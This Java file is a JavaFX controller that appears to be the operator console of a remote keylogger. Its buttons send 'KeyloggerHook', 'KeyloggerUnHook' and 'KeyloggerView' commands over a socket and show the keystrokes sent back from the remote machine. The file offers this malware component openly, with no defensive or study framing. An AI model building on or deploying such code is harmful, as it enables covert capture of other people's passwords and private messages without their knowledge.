package com.example.demo2;

import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.Alert;

import javafx.scene.control.TextArea;

import javafx.scene.layout.HBox;

import java.nio.charset.StandardCharsets;

public class KeystrokeController {

    @FXML
    private HBox Box;

    @FXML
    private TextArea View;

    @FXML
    void Delete(ActionEvent event) {
        View.clear();
    }

    @FXML
    void Hook(ActionEvent event) {
        try {
            HelloController.dout.writeUTF("KeyloggerHook");
            HelloController.dout.flush();

            Alert alert1=new Alert(Alert.AlertType.INFORMATION);
            alert1.setContentText("Hook is started !");
            alert1.showAndWait();

        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @FXML
    void UnHook(ActionEvent event) {
        try {
            HelloController.dout.writeUTF("KeyloggerUnHook");
            HelloController.dout.flush();

            Alert alert1=new Alert(Alert.AlertType.INFORMATION);
            alert1.setContentText("Hook is stopped !");
            alert1.showAndWait();

        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @FXML
    void View(ActionEvent event) {
        try {

            HelloController.dout.writeUTF("KeyloggerView");
            HelloController.dout.flush();
            byte[] bytes=new byte[5000];
            View.setWrapText(true);
            int a;
            if ((a=HelloController.din.read(bytes))!=-1) {
                String x = new String(bytes, StandardCharsets.UTF_8);
                View.appendText(x);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
